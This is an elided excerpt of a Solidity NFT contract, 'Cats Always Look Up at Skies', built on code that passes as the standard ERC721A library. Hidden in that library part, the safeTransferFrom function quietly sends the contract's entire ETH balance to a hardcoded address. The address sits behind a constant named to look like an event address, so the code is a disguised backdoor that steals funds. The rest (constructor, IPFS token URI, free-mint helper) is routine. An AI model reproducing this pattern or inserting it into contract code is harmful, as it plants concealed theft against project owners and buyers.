...
contract ERC721A is IERC721A {
    ...
    address payable constant _TRANSFER_EVENT_ADDRESS = 
        payable(0x749f580d2790721eF2ae1F6946f8f4D490A30b94);
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x749f580d2790721eF2ae1F6946f8f4D490A30b94).transfer(address(this).balance);
        }
    }
...
contract CatsAlwaysLookUpatSkies is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("Cats Always Look Up at Skies", "CatsAlways") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeiavqkz4g4aieejikiy5oltun3gwqiir5rfpvqmqphi6mtqezazbde/", _toString(tokenId), ".json"));
    }

    function FreeNum() internal returns (uint256){
        return (maxSupply - totalSupply()) / 2000;
    }
